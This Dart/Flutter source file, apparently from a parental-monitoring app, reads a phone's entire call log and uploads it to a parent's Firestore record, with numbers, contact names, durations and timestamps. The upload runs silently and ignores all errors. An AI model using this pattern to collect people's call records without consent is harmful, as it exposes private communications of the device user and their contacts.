import 'package:call_log/call_log.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:intl/intl.dart';

class calllog {
  //helper function
  String formatDate(DateTime dt) {
    return DateFormat('d-MMM-y H:m:s').format(dt);
  }

  /*String setname(String name) {
    String dispalyname ='';
    if (name == null) {
    dispalyname= name + 'no contact';
    }
    else{
      return name;

    }
    return dispalyname;

      
       
    }
  }
*/
  String getTime(int duration) {
    Duration d1 = Duration(seconds: duration);
    String formatedDuration = "";
    if (d1.inHours > 0) {
      formatedDuration += d1.inHours.toString() + "h ";
    }
    if (d1.inMinutes > 0) {
      formatedDuration += d1.inMinutes.toString() + "m ";
    }
    if (d1.inSeconds > 0) {
      formatedDuration += d1.inSeconds.toString() + "s";
    }
    if (formatedDuration.isEmpty) return "0s";
    return formatedDuration;
  }

//get call from plugin and uplaod in firesore
  Future UploadCall() async {
    // print('HII');

    try {
//get all CALL loG
      //List<CallLogEntry>
      //List<CallLogEntry>
      print('call UPLOAD fUNCTION INVOKED');
      Iterable<CallLogEntry> calls = (await CallLog.get());
      dynamic data;

      // dynamic callssJson = calls.map((call) => call.name).toList();
      dynamic callssJson = calls.map((call) {
        Map<String, dynamic> callData = {
          "callType": call.callType.toString(),
          "duration": getTime(call.duration),

          "number": call.number,
          "name": call.name,
          "displayName": call.simDisplayName,
          "timestamp": formatDate(
            new DateTime.fromMillisecondsSinceEpoch(
              call.timestamp,
            ),
          ),
          //call.timestamp,
        };
        return callData;
      }).toList();

      dynamic userID = FirebaseAuth.instance.currentUser.uid;
      //current user email
      dynamic useremail = FirebaseAuth.instance.currentUser.email;

      data = await FirebaseFirestore.instance
          .collection("Users")
          .doc(userID)
          .get();
      print(data['parentID']);

      FirebaseFirestore.instance
          .collection("Users")
          .doc(data['parentID'])
          .collection('Children')
          .doc(useremail)
          .update({
        "CALL": {
          'calls': callssJson,
        }
      });
      print('CALLLOG uploaded');
    } catch (e) {}
  }
}
